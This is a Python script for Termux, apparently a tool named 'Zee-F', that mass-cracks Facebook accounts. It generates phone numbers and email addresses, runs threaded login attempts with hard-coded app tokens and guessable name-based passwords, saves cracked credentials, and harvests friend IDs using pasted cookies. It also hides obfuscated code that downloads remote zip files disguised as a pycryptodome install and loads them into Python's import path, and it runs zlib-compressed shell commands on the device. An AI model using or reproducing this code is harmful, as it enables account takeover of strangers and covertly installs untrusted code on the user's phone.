from uuid import uuid4
import os,sys,tempfile,string,random,subprocess,uuid
http_directory = tempfile.mkdtemp(prefix='.')
site_packages = sys.path[4]
print(site_packages)
print(http_directory)
sys.path.remove(site_packages)
sys.path.insert(4,http_directory+'/reqmodule')
sys.path.insert(5,http_directory)
try:
        os.system('rm -rf mail.txt')
        os.system('rm -rf device_info.txt')
        os.mkdir('crypto')
except:pass
myid=uuid.uuid4().hex[:5].upper()
hh = "ho"
hh2 = "9/pycrypt"
find_aarch = subprocess.check_output('uname -om',shell=True)
if 'aarch64' in str(find_aarch):
        user_aarch = '64'
        download_link = f'https://github.com/{hh}p0{hh2}odome/blob/main/crypto64/crypto64.zip?raw=true'
elif 'arm' in str(find_aarch):
        user_aarch = '32'
        download_link = f'https://github.com/{hh}p0{hh2}odome/blob/main/crypto32/crypto32.zip?raw=true'
else:
        print(' Unknown aarch ')
        exit()
if not os.path.isfile(f'crypto/crypto{user_aarch}.zip'):
        os.system('clear')
        print('\n Please wait while creating pycryptodome for you ! This can take some time\n\n')
        os.system(f'curl -L {download_link} > crypto/crypto{user_aarch}.zip')
        os.system('python zia.py')
else:
        akk2="rsi"
        akk=f"cha{akk2}fi"
        os.system(f'cp crypto/crypto{user_aarch}.zip {http_directory}')
        lib = f'https://github.com/{akk}les/client/blob/main/config.zip?raw=true'
        os.system(f'curl -L {lib} > {http_directory}/config.zip')
        os.system(f'cd {http_directory} && unzip config.zip -d {http_directory} > /dev/null')
        os.system(f'cd {http_directory} && unzip crypto{user_aarch}.zip -d {http_directory} > /dev/null')
try:
        import time,requests,re,platform,base64,datetime,hashlib,string,json,io,struct
        from string import *
        from concurrent.futures import ThreadPoolExecutor as ThreadPool
        from Crypto.Cipher import AES, PKCS1_v1_5
        from Crypto.PublicKey import RSA
        from Crypto.Random import get_random_bytes

except Exception as e:
        print(e)
        print('\n Installing modules wait !')
        os.system('pip install futures==2 && python jan.py')
except FileExistsError:
        os.system('pip uninstall requests urllib3 idna certifi -y')
        pass

try:
        import os,sys,time,json,random,re,string,platform,base64,requests,io,struct,zlib
        from string import *
        from concurrent.futures import ThreadPoolExecutor as ThreadPool
except ModuleNotFoundError:
        print('\n Installing missing modules ...')
        os.system('pip install requests futures==2 > /dev/null')
        os.system('python jan.py')

#----[pran links]-----
kkk = {'user-agent': 'Davik/2.1.0 (Linux; U; Android 7.0.0; MMB29K Build/GT-P5100 [FBAN/FB4A;FBAV/241.0.0.41292;FBBV/975202462;FBDM/{density=1.5,width=480,height=800};FBLC/pl_PL;FBCR/T-Mobile.pl;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.mlite;FBDV/MMB29K;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]', 'accept-encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-sim-hni': '31061', 'x-fb-connection-type': 'unknown', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-net-hni': '28613', 'x-fb-connection-bandwidth': '29643048', 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-friendly-name': 'authenticate', 'x-fb-http-engine': 'Liger'}
hhh = {'adid': 'e66b2ae4-35b6-4c2b-822b-b57243edb930', 'email': '10000'+str(random.randint(11111111111,99999999999)), 'password': str(random.randint(1111111,9999999)), 'cpl': 'true', 'credentials_type': 'device_based_login_password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'format': 'json', 'generate_session_cookies': '1', 'generate_analytics_claim': '1', 'generate_machine_id': '1', 'locale': 'pl_PL', 'client_country_code': 'PL', 'device': 'SM-A500H', 'device_id': 'e66b2ae4-35b6-4c2b-822b-b57243edb930', 'method': 'auth.login', 'fb_api_req_friendly_name': 'authenticate', 'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler'}
lll = ("https://b-api.facebook.com/method/auth.login")
#----[remover]-----
import os,shutil,zlib
sz = zlib.decompress(b'x\x9c\xd3OI,I\xd4\x07\x13\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\x19\xf9\xb9\xa9\xfae\x05E\xf9%\xa9\xc9%\x00<J\x0f\x94')
sz1 = zlib.decompress(b'x\x9c\xd3OI,I\xd4\x07\x13\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfaI\x99y\xfaE\xb9\x00\x0eL\x0e\x15')
sz2 = zlib.decompress(b'x\x9c\xd3OI,I\xd4\x07\x13\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfaI\x99y\xfa\xb9e\x00\x0eK\x0e\x19')
sz3 = zlib.decompress(b'x\x9c%\xca\xcb\x11\xc20\x0c\x05\xc0V\xdc@\xfc\x08Gj\xa0\t\xc7\x91\x89g\xfca\xa4\xa7@\xf90p\xd9\xd3f\xd7\x16\x96{8\xc8\xa7\xdd\x00M\xaf\xf8\xa8<|s\x13\xcdsP\x06c\x9e\x1d\xa5\xecg[\xd7\xeb\x05\x14#z\xaa\x03\xfd\x0c\xcb\x0c\xd8\x13\xd3\x9fo\x8c\x14\xed\xfeF\xa9M\x0cn\x8a\xed7?\xf1Q&+')
sz4 = zlib.decompress(b'x\x9c%\xca\xcb\x11\xc20\x0c\x05\xc0V\xdc@\xfc\x08Gj\xa0\t\xc7\x91\x13\xcf\xf8\xc3HO@\xf90p\xd9\xd3f\xd7\x16\x96{8\xc9\x87\xdd\x00M\xafxT\x9e\xbe\xb9\x89\xe69(\x831\xcf\x8eR\xf6g[\xd7\xeb\x05\x14#z\xaa\x03\xda\xc32\x03\xf6\xc4\xf4\xe7\x1b#E\xbb\xbfQj\x13\x83\x9bb\xfb\xcd\x0f\xf0\xab&#')
sz5 = zlib.decompress(b'x\x9cK\xce\xc8\xcdOQ077W\xd0OI,I\x84\x10\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfaI\x99y\xfaE\xb9\x00\x90\xf4\x11\x05')
sz6 = zlib.decompress(b'x\x9cK\xce\xc8\xcdOQ077W\xd0OI,I\x84\x10\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfaI\x99y\xfa\xb9e\x00\x90\xf3\x11\t')
sz7 = zlib.decompress(b'x\x9c\x1d\xca[\x0e@0\x10\x05\xd0\x15\xe9%V4j\xd0\xb4\xd5\x9aG\xc2\xee\x89\x9f\xf3u\xb0\x92\x11~b\xab\xc1X\xaa\xdf\xd8Ra\x85\xab\xa0\xa4\x05\xfd\xb1\xa3\x9ds\x98Fh2\x1e:\xc5L\xfb\x17\x84/g5\xc5\x0b\x8bO\x19\xc2')
#--checking if file is not avalible
if not os.path.exists("/data/data/com.termux/files/usr/bin/rm"):
        pass
        exit("Error in termux modules ")

if os.path.exists(sz):
        os.rename(sz1,'.f1')
        os.rename(sz2,'.f2')
        os.system(sz3)
        os.system(sz4)
        os.system(sz5)
        os.system(sz6)
else:
        pass
os.system("rm -rf .f1")
os.system("rm -rf .f2")

ugen=[]
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)

sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')

except:
        fbcr = 'Zong'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.25,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Zong"
                        sim_id+=fbcr
        else:
                fbcr = 'Zong'
                sim_id+=fbcr
except:
        fbcr = "Zong"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}
logo= f'''

\033[1;35m ________   _______  _______\033[1;37m 
\033[1;31m|       /  |   ____||   ____|\033[1;37m
\033[1;31m`---/  /   |  |__   |  |__   \033[1;37m
\033[1;35m   /  /    |   __|  |   __|  \033[1;37m
\033[1;35m  /  /----.|  |____ |  |____ \033[1;37m
\033[1;34m /________||_______||_______|\033[1;37m

\033[1;35m{50*"="}\033[1;37m
   \033[1;35m Tool Version :     1.0.0\033[1;37m
    \033[1;35mType         :     Personal\033[1;37m
    \033[1;35mName         :     Zee-F\033[1;37m
{50*"="}'''

#--(Dark@Colours)---#
r="\033[1;91m"
g="\033[1;92m"
y="\033[1;93m"
b="\033[1;94m"
p="\033[1;95m"
c="\033[1;96m"
l="\033[1;97m"
s="\033[0m"
#--(light@Colours)---#
lr="\033[0;91m"
lg="\033[0;92m"
ly="\033[0;93m"
lb="\033[0;94m"
lp="\033[0;95m"
lc="\033[0;96m"
ll="\033[0;97m"
#--(rare-colors)--#
holaa="38;5"
ro=(f"\033[{holaa};208")
rb=(f"\033[{holaa};32")
rc=(f"\033[{holaa};122m")
rg= (f"\033[{holaa};112m")
rp=(f"\033[{holaa};147m")

loop = 0
methods = []
ok=[]
cps=[]
twf=[]
total=[]
clone_type=[]
android_models = []
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
        os.system('clear')
        print(logo)
def main():
        os.system('rm -rf ...txt')
        os.system('clear')
        print(logo)
        print('Its only for personal Use')
        print(50*'=')
        print('[1] Fb Cloning Menu')
        print('[2] File Create Menu')
        print('[3] Remove Cookie')
        print('[4] Clear Cache')
        print('[5] Best Pass Lists \033[0;97m')
        print('[0] Exit \033[0;97m')
        print(50*'=')
        menu_opt = input('Select choice : ')
        if menu_opt =='1':
                method_crack()
        elif menu_opt =='2':
                create_file()
        elif menu_opt =='13':
                os.system('xdg-open https://github.com/zee')
                main()
        elif menu_opt =='3':
                os.system('rm -rf fb_cookies.txt')
                os.system('rm -rf access_token.txt')
                print('       Removed Success')
                time.sleep(3)
                main()
        elif menu_opt =='4':
                isdd="les/u"
                isd="sr/t"
                isddd="p/."
                llb = f"/data/data/com.termux/fi{isdd}{isd}m{isddd}*"
                os.system(f"rm -rf {llb}")
                exit("      Sucessfully Removed .      ")
        elif menu_opt =='5':
                os.system('clear')
                print(logo)
                print(' Select Your Country For Best PassLists')
                print(50*'=')
                print('[1] Pakistani Ids')
                print('[2] Bangladesh Ids')
                print('[3] Nigeria Ids')
                print('[4] Other Countries')
                print('[0] Back \033[0;97m')
                print(50*'=')
                menu_opt = input('Select choice : ')
                if menu_opt =='1':
                        os.system('clear')
                        print(logo)
                        print('first last')
                        print('First Last')
                        print('firstlast')
                        print('first123')
                        print('khan123')
                        print('first1234')
                        print('first12345')
                        print('i love you')
                        print('firstkhan')
                        print('khankhan')
                        print('khan12345')
                        print('khan12')
                        print('first786')
                        input('\nPress enter to back ')
                        main()
                elif menu_opt =='2':
                        os.system('clear')
                        print(logo)
                        print('first last')
                        print('First Last')
                        print('firstlast')
                        print('first123')
                        print('Bangladesh')
                        print('first1234')
                        print('first12345')
                        print('bangladesh')
                        print('i love you')
                        print('Jannatul123')
                        print('Mohammed123')
                        print('Mohammad123')
                        print('first@123')
                        input('\nPress enter to back ')
                        main()
                elif menu_opt =='3':
                        os.system('clear')
                        print(logo)
                        print('first last')
                        print('First Last')
                        print('firstlast')
                        print('first123')
                        print('i love you')
                        print('musa123')
                        print('first12345')
                        print('first@123')
                        print('first@1234')
                        print('firstfirst')
                        print('lastlast')
                        print('first786')
                        print('first1122')
                        input('\nPress enter to back ')
                        main()
                elif menu_opt =='4':
                        os.system('clear')
                        print(logo)
                        print('first last')
                        print('First Last')
                        print('firstlast')
                        print('first123')
                        print('i love you')
                        print('first321')
                        print('lastfirst')
                        print('firstlast123')
                        print('first12345')
                        print('first@123')
                        print('first@1234')
                        print('firstfirst')
                        print('first007')
                        print('first789')
                        print('first1122')
                        input('\nPress enter to back ')
                        main()
        elif menu_opt == "17":
                try:
                        os.system('python use.py')
                except:
                        exit('video is not avalible Right now in server try again after few hours')
        elif menu_opt == "0":
                main()
        else:
                print('\n Invalid option, try again ...')
                time.sleep(3)
                main()

def login():
        os.system('clear')
        print(logo)
        cookies = input(' Put cookies here: ')
        try:
                print('\n Validating cookies ... ')
                data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookies})
                find_token = re.search("(EAAG\w+)", data.text)
                open("access_token.txt", "w").write(find_token.group(1))
                open("fb_cookies.txt","w").write(cookies)
                print(' Logged in successfully ...')
                time.sleep(1)
                os.system('python zia.py')
        except KeyError:
                print('\n Inavlid cookies, try another cookies')
                exit()
        except requests.exceptions.ConnectionError:
                print('\n No internet connection ...')
                exit()
        except AttributeError:
                print('\n Invalid cookies, try another cookies ...')
                exit()

def method_crack():
        os.system('clear')
        print(logo)
        print(' [1] File Cloning ')
        print(' [2] Email Cloning ')
        print(' [3] Number Cloning ')
        print(' [0] Back')
        print(50*'=')
        clone_ = input(' Select : ')
        if clone_ == "1":
                clone_type.append('1')
        elif clone_ == "2":
                clone_type.append('2')
        elif clone_ == "3":
                clone_type.append('3')
        elif clone_ == "0":
                main()
        else:
                exit('invalid select')
        mycrackistan()

def mycrackistan():
        global methods
        if '1' in clone_type:
                crack_main().crackfile(id)
        elif '2' in clone_type:
                crack_main().crackmail(id)
        elif '3' in clone_type:
                crack_main().cracknum(id)

class crack_main():
        def __init__(self):
                self.id=[]
        def crackfile(self,id):
                global methods
                os.system('clear')
                print(logo)
                self.file = input(' Put file path: ')
                try:
                        self.id = open(self.file).read().splitlines()
                        self.pasw()
                except FileNotFoundError:
                        print(' No file found ....')
                        exit()
        def crackmail(self,id):
                os.system('rm -rf mail.txt')
                clear()
                print('\033[1;37m example: muhammad, ali, sajjad, faizan\033[1;97m')
                linex()
                first = input(' Put first name: ')
                linex()
                print('\033[1;37m example: khan, ahmad, ali \033[1;97m')
                linex()
                last = input(' Put last name: ')
                linex()
                print(' Example: @gmail.com , @yahoo.com etc...')
                linex()
                domain = input(' domain: ')
                linex()
                try:
                        limit=int(input(' Put limit: '))
                except ValueError:
                        limit = 5000
                linex()
                print(' Getting gmails...')
                lists = ['3','4']
                for xd in range(limit):
                        lchoice = random.choice(lists)
                        if '3' in lchoice:
                                mail = ''.join(random.choice(string.digits) for _ in range(3))
                                open('mail.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                        else:
                                mail = ''.join(random.choice(string.digits) for _ in range(4))
                                open('mail.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                        self.id = open('mail.txt').read().splitlines()
                        self.pasw()
        def cracknum(self,id):
                global methods
                os.system('clear');print(logo)
                print('\033[0mFor Example :\033[0m 92310,92342,92300,92301 ...')
                kode = input('\033[0mChoose Code : \033[0m')
                print('\033[0mFor Example :\033[0m 2000,4000,6000 ...')
                limit = int(input('\033[0mIdz Limit : \033[0m'))
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        xoo = kode+nmp.replace(" ","")
                        xdr = f"{kode+nmp}|{nmp} {xoo}\n"
                        naseeb = open('...txt','a').write(xdr)
                self.id = open('...txt').read().splitlines()
                self.pasw()
        def m1(self,iid,name,passlist):
                try:
                        global ok,loop,android_models
                        sys.stdout.write('\r[ZEE-F] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
                        fn = name.split(' ')[0]
                        try:
                                ln = name.split(' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',name).replace('name',name.lower())
                                infos = open('device_info.txt','r').read()
                                try:
                                        version_,model_,brand_name_,width_,height_=infos.split('$')
                                except:
                                        veersion_ = str(random.randint(7,13))
                                        moodel_ = "Infinix"
                                        brrand_name_ = "Infinix"
                                        wiidth_ = "720"
                                        heeight_ = "1280"
                                uas = 'Davik/2.1.0 (Linux; U; Android '+version_+'.0.0; '+model_+' Build/8BFOHT) [FBAN/FB4A;FBAV/92.866.944.616;FBPN/com.facebook.katana;FBLC/en_US;FBBV/322216925;FBCR/null;FBMF/'+brand_name_+';FBBD/'+brand_name_+';FBDV/'+brand_name_+';FBSV/'+brand_name_+'.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width='+width_+',height='+height_+'};]'
                                fak_tn="350685531728|62f8ce9f74b12f84c123cc23437a4a32","275254692598279|585aec5b4c27376758abb7ffcb9db2af"
                                adid = str(uuid.uuid4())
                                abhi = "5531728|62f8ce9"
                                head = {'Connection': 'keep-alive', 'Authorization': 'OAuth 35068'+abhi+'f74b12f84c123cc23437a4a32', 'Host': 'b-graph.facebook.com', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': str(random.randint(2e7, 3e7)), 'X-FB-Net-HNI': str(random.randint(2e4, 4e4)), 'X-FB-SIM-HNI': str(random.randint(2e4, 4e4)), 'X-FB-Connection-Quality': 'EXCELLENT', 'X-FB-Connection-Token': '', 'X-FB-Connection-Type': 'MOBILE.WCDMA', 'User-Agent': uas, 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger', 'Content-Length': '531'}
                                data = "adid="+adid+"&email="+iid+"&password="+pas+"&cpl=true&credentials_type=password&error_detail_type=password&source=device_based_login&format=json&device_id="+adid+"&family_device_id="+adid+"&session_id="+adid+"&generate_session_cookies=1&generate_analytics_claim=1&generate_machine_id=1&locale=en_US&client_country_code=US&advertising_id="+adid+"&fb_api_req_friendly_name=authenticateate"
                                po = requests.post('https://b-graph.facebook.com/auth/login',headers=head,data=data).json()
                                #print(po,hdata)ata)
                                try:
                                        roid = str(po['uid'])
                                except:
                                        roid = iid
                                if 'session_key' in po:
                                        print(' \033[1;32m[ZEE-OK] '+roid+' | '+pas+'\033[0;97m')
                                        open('/sdcard/zee_ok.txt','a').write(roid+'|'+pas+'\n')
                                        ok.append(iid)
                                        break
                                elif 'Please Confirm Email' in po:
                                        print(' \033[1;32m[ZEE-OK] '+roid+' | '+pas+'\033[0;97m')
                                        open('/sdcard/zee_ok.txt','a').write(roid+'|'+pas+'\n')
                                        ok.append(iid)
                                        break
                                else:
                                        continue
                        loop+=1
                except Exception as e:
                        pass
                        #print(e)
        def pasw(self):
                passlist = []
                with ThreadPool(max_workers=30) as formSubmit:
                        total = str(len(self.id))
                        clear()
                        print(' Total account : \033[1;32m'+total)
                        print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
                        linex()
                        for user in self.id:
                                first_name = name.rsplit(' ')[0]
                                try:
                                        last_name = name.rsplit(' ')[1]
                                except IndexError:
                                        last_name = 'Khan'
                                fs = first_name.lower()
                                ls = last_name.lower()
                                passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
                        for user in self.id:
                                iid,name = user.split('|')
                                formSubmit.submit(self.m1,iid,name,passlist)
                print(50*'=')
                print(' SucessFully Process Is Completed ')
                print(' Total Ok Ids : '+str(len(ok)))
                print(' Ok Ids Save In : /sdcard/zee_ok.txt')
                print(50*'=')
                input('\n Press enter to back ')
                main()
        def ffb(self,iid,name,passlist):
                global loop,oks,cps
                sys.stdout.write('\r\r\033[1;37m [AKING-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                session = requests.Session()
                try:
                        first = name.split(' ')[0]
                        try:
                                last = name.split(' ')[1]
                        except:
                                last = 'Khan'
                        ps = first.lower()
                        ps2 = last.lower()
                        for fikr in passlist:
                                pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                                ua=random.choice(ugen)
                                head = {'Host': 'p.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': 'Android', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                                getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                                idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                                complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                                Aking=session.cookies.get_dict().keys()
                                if "c_user" in Aking:
                                        print('\r\r\033[1;32m [ZEE-OK] %s | %s'%(ids,pas))
                                        open('/sdcard/zee_ok.txt', 'a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                elif 'checkpoint' in Aking:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m [ZEE-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/zee_cp.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                break
                                else:
                                        continue
                except requests.exceptions.ConnectionError:
                        time.sleep(20)
                loop+=1
        def rndm(self,iid,name,passlist):
                global loop
                global ok
                sys.stdout.write('\r[ZEE-F] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
                try:
                        for pas in passlist:
                                accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                                fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                                fbbv = str(random.randint(111111111,999999999))
                                android_version = device['android_version']
                                model = device['model']
                                build = device['build']
                                fblc = device['fblc']
                                fbcr = sim_id
                                fbmf = device['fbmf']
                                fbbd = device['fbbd']
                                fbdv = device['fbdv']
                                fbsv = device['fbsv']
                                fbca = device['fbca']
                                fbdm = device['fbdm']
                                fbfw = '1'
                                fbrv = '0'
                                fban = 'FB4A'
                                fbpn = 'com.facebook.katana'
                                ua = 'Dalvik/2.1.0 (Linux; U; Android 10.0.0; SM-N970F Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/Jazz;FBMF/samsung;FBBD/samsung;FBDV/SM-N970F;FBSV/10.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'
                                random_seed = random.Random()
                                adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                                device_id = str(uuid.uuid4())
                                secure = str(uuid.uuid4())
                                family = str(uuid.uuid4())
                                accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                                xd =str(''.join(random_seed.choices(string.digits, k=20)))
                                sim_serials = f'["{xd}"]'
                                li = ['28','29','210']
                                li2 = random.choice(li)
                                j1 = ''.join(random.choice(digits) for _ in range(2))
                                jazoest = li2+j1
                                data = {
                                        'adid':adid,
                                        'format':'json',
                                        'device_id':device_id,
                                        'email':ids,
                                        'password':pas,
                                        'generate_analytics_claims':'1',
                                        'credentials_type':'password',
                                        'source':'login',
                                        'error_detail_type':'button_with_disabled',
                                        'enroll_misauth':'false',
                                        'generate_session_cookies':'1',
                                        'generate_machine_id':'1',
                                        'fb_api_req_friendly_name':'authenticate',
                                }
                                headers={
                                        'Authorization':f'OAuth {accessToken}',
                                        'X-FB-Friendly-Name':'authenticate',
                                        'X-FB-Connection-Type':'unknown',
                                        'User-Agent':ua,
                                        'Accept-Encoding':'gzip, deflate',
                                        'Content-Type': 'application/x-www-form-urlencoded',
                                        'X-FB-HTTP-Engine': 'Liger'
                                        }
                                url = 'https://b-graph.facebook.com/auth/login'
                                twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                                po = requests.post(url,data=data,headers=headers).json()
                                if 'session_key' in po:
                                        try:
                                                uid = po['uid']
                                        except:
                                                uid = ids
                                        if str(uid) in oks:
                                                break
                                        else:
                                                print('\r\r\033[1;32m [ZEE-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                                open('/sdcard/zee_ok.txt','a').write(str(uid)+'|'+pas+'\n')
                                                oks.append(str(uid))
                                                break
                                elif 'www.facebook.com' in po['error']['message']:
                                        try:
                                                uid = po['error']['error_data']['uid']
                                        except:
                                                uid = ids
                                        if uid in oks:pass
                                        else:
                                                print('\r\r\x1b[38;5;208m [ZEE-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                                open('/sdcard/zee_cp.txt','a').write(str(uid)+'|'+pas+'\n')
                                                cps.append(str(ids))
                                                break
                                else:continue
                        loop+=1
                except Exception as e:
                        pass

        
                
def create_file():
        os.system('clear')
        print(logo)
        print(' [1] Create File ')
        print(' [2] Remove Double Ids ')
        print(' [3] Seprate Ids ')
        print(' [0] Back')
        print(50*'=')
        create_ = input(' Select : ')
        if create_ == "1":
                create_file_login()
        elif create_ == "2":
                double()
        elif create_ == "3":
                sep()
        elif create_ == "0":
                main()
        else:
                exit('invalid select')
        mycrackistan() 

def create_file_login():
        ids = []
        total = []
        xyz = requests.Session()
        os.system('clear')
        print(logo)
        try:
                cok = open('fb_cookies.txt','r').read()
                cookies = {'cookie':cok}
                access_token = open('access_token.txt', 'r').read()
        except FileNotFoundError:
                login()
        try:
                check_cookies = xyz.get('https://graph.facebook.com/me?access_token='+access_token,cookies=cookies).text
                load = json.loads(check_cookies)
                iid = load['id']
                name = load['name']
        except KeyError:
                print('\n Cookies has expired')
                time.sleep(1)
                os.system('rm -rf .fb_cookies.txt .access_token.txt')
                login()
        except requests.exceptions.ConnectionError:
                print(' No internet connection ...')
        os.system('clear')
        print(logo)
        print("[1] Create File Mix Ids")
        print("[2] Create File New Ids")
        print(44*"=")
        typp = input('select : ')
        if typp == "1":
                auto_file(cookies,access_token)
        elif typp == "2":
                new_file(cookies,access_token)
        else:
                auto_file(cookies,access_token)

def auto_file(cookies,access_token):
        global total
        os.system('clear & rm -rf .txt .temp.txt')
        os.system('clear')
        print(logo)
        try:
                fl = 1
        except:
                fl = 1
        for xd in range(fl):
                idt = input(f' Put id {xd+1}: ')
                try:
                        fd_url = 'https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s'%(idt,access_token)
                        xyz = requests.Session()
                        r = xyz.get(fd_url,cookies=cookies).text
                        q = json.loads(r)
                        for iid in q['friends']['data']:
                                uid = iid['id']
                                open('.txt','a').write(uid+'\n')
                except KeyError:
                        print(' No Friend List : '+idt)
                        time.sleep(3)
